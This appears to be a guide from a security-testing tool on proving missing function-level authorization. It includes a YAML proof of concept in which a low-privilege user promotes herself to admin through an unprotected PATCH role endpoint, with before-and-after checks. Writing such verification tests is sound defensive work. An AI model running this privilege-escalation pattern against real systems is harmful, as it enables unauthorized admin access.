# bfla: proving missing function-level authorization

## What proves it
A principal **without** the required role successfully performs a privileged function (admin
action, approval, role change, export of all users), and the effect is visible afterwards.

## Setup
- A low-privilege user (`mallory`, the default role a sign-up gets). If the function acts on
  someone else or the proof needs a before/after view, also an `admin` seeded in the EnvSpec.
- Find a read-back that shows the effect: the changed role in `/api/me`, the approved status of
  the object, data only admins can list.

## Steps
1. Control: mallory's current state shows the function has not happened (`role eq user`).
2. Exploit: mallory calls the privileged endpoint.
3. Read-back: the effect is visible.

```yaml
kind: http
hypothesis_id: H3
description: >
  The new PATCH /api/admin/users/<id>/role handler has no admin check. mallory (role user)
  promotes herself to admin and /api/me then reports role admin.
users:
  mallory:
    vars: {username: mallory, password: mallory-dev-pw}
    login:
      - name: mallory_login
        method: POST
        path: /api/login
        json: {username: "${USER.username}", password: "${USER.password}"}
        expect_status: [200]
steps:
  - name: me_before
    as: mallory
    path: /api/me
    expect_status: [200]
    extract:
      uid: {json: id}
  - name: promote
    as: mallory
    method: PATCH
    path: /api/admin/users/${USER.uid}/role
    json: {role: admin}
  - name: me_after
    as: mallory
    path: /api/me
    expect_status: [200]
oracles:
  - type: json_compare
    step: me_before
    path: role
    op: eq
    value: user
  - type: response_status
    step: promote
    status: [200, 204]
  - type: json_compare
    step: me_after
    path: role
    op: eq
    value: admin
```

## Pitfalls
- A `200` from the privileged endpoint is not enough: some handlers answer 200 and do nothing.
  Prove the effect with a read-back or a `command` oracle that queries the database.
- Anonymous access to an admin function is a stronger claim; prove it with no user at all.
- For read-only admin functions (`GET /api/admin/users`), match data only an admin may see
  (another seeded user's email), and add a control that the same data is not in mallory's own
  profile.
